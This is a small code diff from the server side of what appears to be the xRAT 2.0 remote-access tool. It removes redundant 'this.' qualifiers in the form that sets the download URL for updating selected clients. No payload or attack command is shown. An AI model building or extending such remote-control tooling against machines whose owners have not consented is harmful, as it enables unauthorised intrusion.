@@ -15,7 +15,7 @@ namespace xServer.Forms
 
         private void FrmUpdate_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", _selectedClients);
+            Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", _selectedClients);
             txtURL.Text = Core.Misc.Update.DownloadURL;
         }
 
@@ -23,8 +23,8 @@ namespace xServer.Forms
         {
             Core.Misc.Update.DownloadURL = txtURL.Text;
 
-            this.DialogResult = DialogResult.OK;
-            this.Close();
+            DialogResult = DialogResult.OK;
+            Close();
         }
     }
 }
